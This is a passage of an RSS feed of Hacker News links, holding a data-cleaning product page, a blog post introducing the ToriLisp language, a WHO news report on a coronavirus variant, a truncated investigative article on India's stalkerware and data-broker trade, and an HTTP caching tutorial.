            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415925894-9967DQSXJ7G02UKKTVEL/ke17ZwdGBToddI8pDm48kO5UttOiHZHOdyRgSsyxuNx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UU-GMacxtmTFmxj8iTLE5xm_olV_MfCgX22vGCD_WHCDOpYghpI-Ha_TwZsqqmJXng/spreadsheetdata.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415925894-9967DQSXJ7G02UKKTVEL/ke17ZwdGBToddI8pDm48kO5UttOiHZHOdyRgSsyxuNx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UU-GMacxtmTFmxj8iTLE5xm_olV_MfCgX22vGCD_WHCDOpYghpI-Ha_TwZsqqmJXng/spreadsheetdata.png" data-image-dimensions="1860x1085" data-image-focal-point="0.5,0.5" alt="spreadsheetdata.png" src="https://phiona.com/spreadsheetdata.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Your Friendly Data Cleaning Co-Pilot</p></div>
              

              
                <div><p>No more searching for data inconsistencies. Phiona automatically detects potential issues in your data, and you simply select answers on fixing duplicates, inconsistencies, formatting issues and more. We translate the code.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-2031c64bd6b934a35042"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608232967485-BXG8CZ5VJNZA370RNYJD/ke17ZwdGBToddI8pDm48kHzdCBlQ63jloI4u1zY60pd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USvOE0u8pvGxmG7zkdumOsgVB75yStXGYsj0BUW2Nf6kZDqXZYzu2fuaodM4POSZ4w/devpipelines.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608232967485-BXG8CZ5VJNZA370RNYJD/ke17ZwdGBToddI8pDm48kHzdCBlQ63jloI4u1zY60pd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USvOE0u8pvGxmG7zkdumOsgVB75yStXGYsj0BUW2Nf6kZDqXZYzu2fuaodM4POSZ4w/devpipelines.png" data-image-dimensions="2193x1075" data-image-focal-point="0.5,0.5" alt="devpipelines.png" src="https://phiona.com/devpipelines.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Translate Actions to Automated Pipelines</p></div>
              

              
                <div><p>Build complex data workflows by interactively transforming and applying changes as blueprints within a spreadsheet view. Easily orchestrate your data refreshes, blueprint runs and exports.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1608219965971_159353"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608235844858-T9Q76MLETSGFVY6CUV3Z/ke17ZwdGBToddI8pDm48kIn7BAG94Odok_K7Rz00kXYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dqZyB6qEyaPLXnAX3UrkJTH_shP7bOKuqeKATYfTuMZGCjLISwBs8eEdxAxTptZAUg/blueprintversioncontrol.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608235844858-T9Q76MLETSGFVY6CUV3Z/ke17ZwdGBToddI8pDm48kIn7BAG94Odok_K7Rz00kXYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dqZyB6qEyaPLXnAX3UrkJTH_shP7bOKuqeKATYfTuMZGCjLISwBs8eEdxAxTptZAUg/blueprintversioncontrol.png" data-image-dimensions="1964x937" data-image-focal-point="0.5,0.5" alt="blueprintversioncontrol.png" src="https://phiona.com/blueprintversioncontrol.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Version Control Out of the Box <em>(coming soon)</em></p></div>
              

              
                <div><p>Data is always changing, make sure your blueprints keep up with the times. Edit blueprints in the same way you would with code, share them with others, and keep track of them in one place.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-48460b2d31a95d9d7c27"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415280001-9U6KPETMAA9JJX6WTVCE/ke17ZwdGBToddI8pDm48kDjVpyDjcaeNCv9xcSPysqJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdvHFhwYv4HfPO0n3CEjYxeTIAv0UCX0AZ_4taFu_eJf7zs2yPjc1ECvpa5Zm_kMqw/schedule.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415280001-9U6KPETMAA9JJX6WTVCE/ke17ZwdGBToddI8pDm48kDjVpyDjcaeNCv9xcSPysqJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdvHFhwYv4HfPO0n3CEjYxeTIAv0UCX0AZ_4taFu_eJf7zs2yPjc1ECvpa5Zm_kMqw/schedule.png" data-image-dimensions="1714x1016" data-image-focal-point="0.5,0.5" alt="schedule.png" src="https://phiona.com/schedule.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>No more cron job chaos</p></div>
              

              
                <div><p>Run your saved blueprints on a schedule or trigger runs via webhook. Refresh data from one system and update it in another. Or, leave data in the data mesh to be securely accessed via API.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div><div><div data-block-type="5" id="block-2cfbee302d337d43b806"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599509477841-FW9UVGVI6H1EYZ4CPSCP/ke17ZwdGBToddI8pDm48kCdtISRWKP5pMtlo1NrprM5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIdM008-1-KNBfG6kGbj0MupHQG6B7Wfd8o78WB9FeEwQ/phionalogo.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599509477841-FW9UVGVI6H1EYZ4CPSCP/ke17ZwdGBToddI8pDm48kCdtISRWKP5pMtlo1NrprM5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIdM008-1-KNBfG6kGbj0MupHQG6B7Wfd8o78WB9FeEwQ/phionalogo.png" data-image-dimensions="947x285" data-image-focal-point="0.5,0.5" alt="phionalogo.png" data-load="false" data-image-id="5fdb74c3ca1228794288592c" data-type="image" src="https://phiona.com/phionalogo.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div data-block-type="2" id="block-95e5445731557381c156"><p>Get started today with Phiona for free, no credit card required.</p></div></div></div></div>
              </section>
            
          </main>

        </div>
      </div>

      


    </div></div>]]>
            </description>
            <link>https://phiona.com/developers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506864</guid>
            <pubDate>Tue, 22 Dec 2020 15:05:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ToriLisp – an ersatz Lisp for tiny birds]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506759">thread link</a>) | @grzm
<br/>
December 22, 2020 | http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6698">
                 <h3><a href="http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/" title="ToriLisp – an ersatz LISP for tiny birds">ToriLisp – an ersatz LISP for tiny birds</a></h3>
                 <p><span>Dec 22, 2020 </span></p><p>When deciding to work on a side-project three factors are needed to transition from fancy to application: goal, motivation, and time.</p>

<p>Time is usually the biggest sticking point for me personally but with COVID most of what I may have spent my time on this year was cancelled. However, motivation was still a huge sticking point until I came across a couple of projects that helped propel me forward. First, I spent some time earlier this year combing over <a href="https://twitter.com/maryrosecook">Mary Rose Cook</a>‘s lovely <a href="https://github.com/maryrosecook/littlelisp">Little Lisp</a> interpreter code. Given what I knew about Mary’s previous projects it was no surprise that the Little Lisp implementation was simple and elegant. However, what I wasn’t prepared for was that hacking on the interpreter turned out to be straight-forward and addictive. However, it wasn’t until I re-discovered <a href="https://twitter.com/wtaysom">William Taysom</a>‘s old Scheme-like language <a href="https://web.archive.org/web/20090625142941/http://moonbase.rydia.net/mental/blog/programming/misp-is-a-lisp">Misp</a> that I had a form for the interpreter in mind. At the time of William’s original blog posts about Misp I was drawn to his passion and enjoyed the implementations of the language that he posted.<sup id="fnref:dustbin"><a href="#fn:dustbin" rel="footnote">1</a></sup> Around the same time I found Paul Graham’s original Arc tutorial <a href="http://www.arclanguage.org/tut.txt">tut.txt</a> and used it extensively to guide me in what to implement next.<sup id="fnref:readme"><a href="#fn:readme" rel="footnote">2</a></sup> All discussion about Arc aside, I definitely appreciate the clarity and layout of the Arc tutorial and found it a great outline for a little language.</p>

<p>Finally, as some of you might know I <a href="https://www.amazon.com/gp/product/B00D624AQO?tag=fogus-20">dabbled in functional programming in JavaScript</a> and even went so far as to create a couple of libraries pushing the fringe of fp in js; namely <a href="https://github.com/fogus/lemonad">Lemonad</a> and <a href="https://github.com/documentcloud/underscore-contrib">underscore-contrib</a>. Some of the ideas in these libraries found their way into my own interpreter which ultimately pushed my code away from Misp, Little Lisp, and Arc into …something else — that something else I’m calling <strong>Tori Lisp — an ersatz LISP for little birds</strong>.</p>

<center>ToriLisp = Litle Lisp + Misp + tut.txt + Lemonad + underscore-contrib + a pinch of CLJ</center>

<p>Here’s a very small sample of the language:</p>

<pre><code>鳥&gt;  (let (x 3 y 4)
       (+ (* x 2) (* y 2)))
;;=&gt; 14

(def map
  (λ (fn list)
    (if (no list)
      list
      (cons (fn (first list))
            (map fn (rest list))))))

鳥&gt;  (map (+ 10) '(1 2 3))
;;=&gt; [ 11, 12, 13 ]

鳥&gt;  ({x y | (/ (+ x y) 2)} 2 4)
;;=&gt; 3

鳥&gt;  (len "abc")
;;=&gt; 3
鳥&gt;  (len {a | a})
;;=&gt; 1
鳥&gt;  (len +)
;;=&gt; 2

鳥&gt;  (read "(push [1] 'Z)")
;;=&gt; [ "'push", [ "'list", 1 ], [ "'quote", "'Z" ] ]
鳥&gt;  (eval (read "(push [1] 'Z)"))
;;=&gt; [ "'Z", 1 ]  
</code></pre>

<p>If I wanted to present a list of features then the following list would work:<sup id="fnref:mac"><a href="#fn:mac" rel="footnote">3</a></sup></p>

<ul>
<li>Functional</li>
<li>Immutable access to JavaScript arrays and hash-maps.</li>
<li>Function auto-currying</li>
<li>Function introspection</li>
<li>Bottoms-out at JavaScript structures and functions</li>
<li>ML-like Refs</li>
<li>Lightweight syntax for common language forms</li>
</ul>

<p>If you’re interested in checking out the language then the <a href="https://github.com/fogus/tori-lisp">ToriLisp Github repository</a> has a quick start, test suite, and its own tut.txt.</p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
            <link>http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506759</guid>
            <pubDate>Tue, 22 Dec 2020 14:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WHO says no need for major alarm over new coronavirus strain – CTV News]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25506698">thread link</a>) | @mrfusion
<br/>
December 22, 2020 | https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>GENEVA/ZURICH -- 
	The World Health Organization cautioned against major alarm over a new, highly infectious variant of the coronavirus that has emerged in Britain, saying this was a normal part of a pandemic's evolution.</p>
<p>
	WHO officials even put a positive light on the discovery of the new strains that prompted a slew of alarmed countries to impose travel restrictions on Britain and South Africa, saying new tools to track the virus were working.</p>
<p>
	"We have to find a balance. It's very important to have transparency, it's very important to tell the public the way it is, but it's also important to get across that this is a normal part of virus evolution," WHO emergencies chief Mike Ryan told an online briefing.</p>
<p>
	"Being able to track a virus this closely, this carefully, this scientifically in real time is a real positive development for global public health, and the countries doing this type of surveillance should be commended."</p>
<ul>
	<li>
		<a href="https://www.ctvnews.ca/newsletters/the-covid19-brief-newsletter-signup"><strong>Newsletter sign-up: Get The COVID-19 Brief sent to your inbox</strong></a></li>
</ul>
<p>
	Citing data from Britain, WHO officials said they had no evidence that the variant made people sicker or was more deadly than existing strains of COVID-19, although it did seem to spread more easily.</p>
<p>
	Countries imposing travel curbs were acting out of an abundance of caution while they assess risks, Ryan said, adding: "That is prudent. But it is also important that everyone recognizes that this happens, these variants occur."</p>
<p>
	WHO officials said coronavirus mutations had so far been much slower than with influenza and that even the new UK variant remained much less transmissible than other diseases like mumps.</p>
<p>
	They said vaccines developed to combat COVID-19 should handle the new variants as well, although checks were under way to ensure this was the case.</p>
<p>
	"So far, even though we have seen a number of changes, a number of mutations, none has made a significant impact on either the susceptibility of the virus to any of the currently used therapeutics, drugs or the vaccines under development and one hopes that will continue to be the case," WHO Chief Scientist Soumya Swaminathan told the briefing.</p>
<p>
	The WHO said it expects to get more detail within days or weeks on the potential impact of the highly transmissible new coronavirus strain.</p>
<p>
	<em>Reporting by Emma Farge in Geneva and Michael Shields in Zurich; Writing by Josephine Mason; editing by Mark Heinrich.</em></p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506698</guid>
            <pubDate>Tue, 22 Dec 2020 14:46:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India’s booming dark data economy]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506681">thread link</a>) | @pseudolus
<br/>
December 22, 2020 | https://restofworld.org/2020/all-the-data-fit-to-sell/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/all-the-data-fit-to-sell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>A</span>yushi Sahu was ambushed. One evening in 2018, five months after her wedding, the 21-year-old college student was visiting her parents in the central Indian state of Chhattisgarh, when her husband showed up unannounced, his father and uncle in tow.</p>



<p>As the men settled in the living room, her husband said he had something he wanted them to hear. He took out his mobile phone and pressed “play.” The audio was loud and clear: private conversations between Sahu and her friends and family,<strong> </strong>which had been recorded without her permission. And it wasn’t only audio: “call logs, SMS, and WhatsApp messages, each photo and video, recordings of my video calls — he claimed to have accessed everything,” Sahu said. That was when she realized that her husband had, for months, been spying on her.</p>



<p>This was also how Sahu learned of certain things he had been holding against her. (Her name has been changed to protect against retaliation.) He had been offended to hear her complaining to her mother about problems with her in-laws. And he objected to her talking to a male friend. “He made a scene as if he was ‘exposing’ me,” Sahu recalled. “I was just sharing my concerns. That’s normal.”</p>



<p>Her husband played several more recordings, until his father eventually intervened. “I don’t want to listen to any more of this. You have heard it all? Okay, then,” he said, before reaching out to comfort Sahu, who was still in shock.</p>



<p>After processing the experience, Sahu decided she was willing to shrug it off, apologize, and move on, but her new husband continued to behave strangely. Eventually, she felt she had no choice but to end the marriage. “I don’t understand why he had to take this spying route,” she reflected. “He could have just asked. You know, in India, men can scold their wives, right? He could have done that. What was the need to go so deep into my phone and record my conversations?”</p>



<p>Sahu has no idea how her phone was bugged or for how long she was surveilled. But she has one clue: Her Vivo smartphone was an engagement gift from her husband.</p>



<p>It is likely that Sahu’s phone had off-the-shelf spyware on it. Her husband may have installed it himself or even consulted a private detective before marrying her, who provided him with the phone. In either case, he would have been part of a growing trend of individuals — often, jealous lovers — making use of personal surveillance technology.</p>



<p>According to Kunwar Vikram Singh, the chairman of the Association of Private Detectives and Investigators in India, it’s now common for wealthy families to assess the suitability of a potential bride or groom by hiring a private detective, a vetting that usually costs around $500. He attributes this to India’s changing social mores, especially among urban elites. “Work culture has changed. Values have changed,” Singh reflected, citing the influx of women into the workforce as one contributing factor. “We tell people, ‘You spend lakhs and crores on marital ceremonies; spend a few thousand on investigators’,” he said.</p>



<p>Whatever the reason, India’s private-detective services have been growing over the past decade. Singh estimates that the sector is now worth roughly $1.2 billion<strong> </strong>nationally. But because of the sensitive nature of the field, it’s impossible to know for sure: There are no official statistics, and many clients still pay in cash. “They don’t want to leave any footprint,” he noted.</p>



<p>The services offered by the detectives mainly fall into two categories: corporate and personal. The corporate investigations often involve banks hiring investigators to get information on shifty borrowers and financial firms looking for background checks on employees. The personal services range from child monitoring to matrimonial background checks. Every agency has its own specialization. Karnam Choudhary, a Jaipur-based detective who operates the Siyol Detective Network, which has around 1,500 freelance private investigators across the country, says that “since 2016, personal cases make up almost 70%.”</p>



<p>The boom in business has coincided with a growing reliance on consumer-grade spyware. These are mostly smartphone apps that cannot easily be detected, secretly record all of a device’s activity, and route that data to a third-party dashboard. A private investigator’s first move used to be shadowing somebody in person; today, many of them begin by advising the client to present the object of their suspicion with a malware-infected smartphone.</p>



<p>Growing demand for spyware first caught the attention of India’s software engineers several years ago, long before the coronavirus pandemic led to a spike. In 2013, while researching viruses and cybersecurity for his final-year engineering project, Gujarat-based coder Tushar Mepani began meeting parents who wanted to keep closer tabs on their teenagers’ whereabouts. “I could not sleep at night when these millionaires told me about their kids’ behavior,” he said, apparently in earnest. The initial prototype of <a href="http://www.convants.com/">what became his first app for tracking children</a>, EasySpyPhone, was restricted to recording calls and collecting text messages and location data, but more recent iterations can spy on social media platforms like Facebook and WhatsApp, secretly turn on a phone’s microphone to record calls and video, and capture screenshots, all for around $20 or $40 per month. “Parents were very happy,” Mepani reflected. “They learned who their kids are friends with — and who is diverting them. The app has saved kids from being spoiled.”</p>



<figure><blockquote><p>“We had no idea at the time whether people would be interested in this, but it clicked with users.”</p></blockquote></figure>



<p>Mepani doesn’t sell only one or two products, however; through his Android spyware company, Convants Information Security, he licenses surveillance software to multiple vendors, who repackage it under different names. He won’t reveal the details of these arrangements, calling them “internal business,” but he claims to have made more than 20,000 sales. In 2014, Choudhary, the Jaipur-based detective, used Mepani’s software to launch his <a href="http://spymobileprocess.com/">agency’s own app, Spy Mobile Process</a>. Instead of paying for a full investigation, those who buy Choudhary’s app may use it to conduct their own inquiries, with guidance from detectives. “We had no idea at the time whether people would be interested in this,” he said. “But it clicked with users.”</p>



<p>All of this exists in a legal gray area. As of now, there are no laws in India regulating the selling or purchasing of so-called stalkerware. Nor is there much clarity about the privacy laws currently on the books. In India, it is not illegal to physically surveil a target, for instance, but things get fuzzier when it comes to tracking somebody’s location via mobile phone. Courts have been forced to establish statutes, case by case. In 2018, for instance, a family court in Delhi <a href="https://theprint.in/judiciary/evidence-collected-in-breach-of-privacy-does-not-make-it-inadmissible-in-court-delhi-hc/452288/">admitted evidence collected from spyware</a> in a case concerning a marital dispute, stating that the right to a fair trial outweighed privacy protections.</p>



<p>But staying on the right side of the law doesn’t seem to trouble many spyware vendors. Insofar as they are concerned about legal exposure, most will simply add disclaimers that place the onus on the user. Before installing software, the customer should get “proper written consent to do so by the owner of the smartphone” and understand that it is the “responsibility of the buyer to obey all laws of their country.”</p>



<p>In August 2020, Google introduced a new Ads Policy imposing restrictions on advertising for spyware and surveillance technology. “The updated policy will prohibit the promotion of products or services that are marketed or targeted with the express purpose of tracking or monitoring another person or their activities without their authorization,” the company wrote in its updated policy. However, Google made two exceptions: “private investigation services,” like Choudhary’s, and “products or services designed for parents to track or monitor their underage children,” like Mepani’s.</p>



<p>Private detectives who admit to using spyware almost universally insist that any problems stemming from it are the result of abuse. But what they say publicly is one thing, and how they market their services is another. While Choudhary claims his app is not intended for spying on spouses, a <a href="https://twitter.com/Siyol007/status/670517689576726528?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed&amp;ref_url=notion%3A%2F%2Fwww.notion.so%2FSahil-Chajotra-JK-detectives-0f27a3d4a117474eac2b15f591b5d764">November 2015 tweet</a> from his company’s official account said just the opposite. In a series of phone interviews, Mepani also denied marketing his product to jealous husbands and wives, even as his website made clear that these are target demographics. “But you know,” he added, “it is like a knife. You can cut fruits, or you can cut someone’s head.”</p>



<p>However unsettling, the spyware sector is only one small part of a much vaster infrastructure. More than 500 million people in India use the internet every month, creating troves of private information with every click, scroll, swipe, and download. What they watch, how they date, whom they work for, and where they spend their money is constantly being captured and monetized. All this has given rise to a multimillion-dollar dark data economy, in which no piece of information is too personal to trade.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-40x18.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-400x177.png 400w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-600x265.png 600w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1000x442.png 1000w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1600x708.png 1600w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>The black market</strong> for data, as it exists online in India, resembles those for wholesale vegetables or smuggled goods. Customers are encouraged to buy in bulk, and the variety of what’s on offer is mind-boggling: There are databases about parents, cable customers, pregnant women, pizza eaters, mutual funds investors, and almost any niche group one can imagine. A typical database consists of a spreadsheet with row after row of names and key details: Sheila Gupta, 35, lives in Kolkata, runs a travel agency, and owns a BMW; Irfaan Khan, 52, lives in Greater Noida, and has a son who just applied to engineering college. The databases are usually updated every three months (the older one is, the less it is worth), and if you buy several at the same time, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/all-the-data-fit-to-sell/">https://restofworld.org/2020/all-the-data-fit-to-sell/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/all-the-data-fit-to-sell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506681</guid>
            <pubDate>Tue, 22 Dec 2020 14:45:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HTTP Caching]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506495">thread link</a>) | @fxq34a
<br/>
December 22, 2020 | https://adnanahmed.info/blog/2020/12/20/http-caching/ | <a href="https://web.archive.org/web/*/https://adnanahmed.info/blog/2020/12/20/http-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>When we build websites we want them to load fast. One of the best ways is to use caching.</p>

<p>Caching is just keeping a copy closer to the user so you don’t have to get it from someplace farther away. HTTP cache is part of HTTP specs. It gives us a way to keep a copy of the response in the user browser’s memory.</p>

<p>So let’s start talking about what HTTP caching is.</p>

<h2 id="what-is-http-caching">What is HTTP Caching?</h2>
<p>Let’s say user visits “<a href="https://example.com/docs">https://example.com/docs</a>”. Here’s what happens:</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request</li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li>Send a response with the HTML in the body and a status code of 200</li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li>Downloads the body of the response</li>
      <li>Browser renders the page</li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-1.jpg">
</figure>

<p>The next time user visits the page all of that has to happen all over again unless the server sends some specific header that tells the browser to cache it: “Cache-Control”.</p>

<p>That’s right, your browser already knows how to cache responses so it doesn’t have to download them more than once.</p>

<p>So if your server was sending a response like this:</p>

<div><div><pre><code><span>return</span> <span>response</span><span>(</span><span>body</span><span>,</span> <span>{</span>
  <span>headers</span><span>:</span> <span>{</span>
    <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>text/html</span><span>"</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>You just add the Cache Control header:</p>

<div><div><pre><code><span>return</span> <span>response</span><span>(</span><span>body</span><span>,</span> <span>{</span>
  <span>headers</span><span>:</span> <span>{</span>
    <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>text/html</span><span>"</span><span>,</span>
    <span>"</span><span>Cache-Control</span><span>"</span><span>:</span> <span>"</span><span>max-age=0, must-revalidate</span><span>"</span><span>,</span>
    <span>"</span><span>Etag</span><span>"</span><span>:</span> <span>md5</span><span>(</span><span>body</span><span>)</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>These two lines change quite a bit for the user when he next visits the page. Let’s check it out.</p>

<h2 id="request-with-caching">Request with Caching</h2>

<p>Here’s what happens when visiting the page for the first time.</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request</li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li>Send a response with the HTML in the body and a status code of 200
        <ul>
          <li>Sends <strong>“Cache-Control”</strong> and <strong>“Etag”</strong> headers</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li>Downloads the body of the response</li>
      <li>Browser renders the page</li>
      <li><strong>Browser caches the page on disk or in memory</strong></li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-2.jpg">
</figure>

<p>Now here’s what happens when the user visits the page second time.</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request
        <ul>
          <li>Also sends request header <strong>If-None-Match with the Etag from last request</strong></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li><strong>Compares the Etag headers to its new Etag</strong></li>
      <li><strong>Etag matches, sends an empty response and a status code of 304</strong></li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li><strong>Sees 304, downloads nothing, reads from cache</strong></li>
      <li>Renders the page</li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-3.jpg">
</figure>

<p>So how is this faster? As the browser doesn’t have to download the page again. You will also notice, that our server still had to generate the content to compare the Etag to know if it could send a 304 or not.</p>

<p>Now let’s see how can we fix this.</p>

<h2 id="changing-max-age">Changing max-age</h2>
<p>We used “max-age=0, must-revalidate” last time. What happens if we use “max-age=3600”. This tells the browser to cache this for an hour.</p>

<p>So this is what happens when the user sends a request a second time.</p>

<ul>
  <li>Browser
    <ul>
      <li>Looks at max-age from last request</li>
      <li>Sees it’s within an hour, doesn’t even make a request, reads from cache</li>
      <li>Renders the page</li>
    </ul>
  </li>
</ul>

<p>For the next hour, the user is on your website, they won’t be downloading any of the same pages twice.</p>

<h2 id="cdns">CDNs</h2>

<p>So far we’ve optimized the second visit to a page for a single user. But when another visitor shows up, we’re going to have to do the whole request, the server builds the page, sends the response cycle again.</p>

<p>That’s where a CDN can come in. Think of a CDN as a shared cache among your visitors.</p>

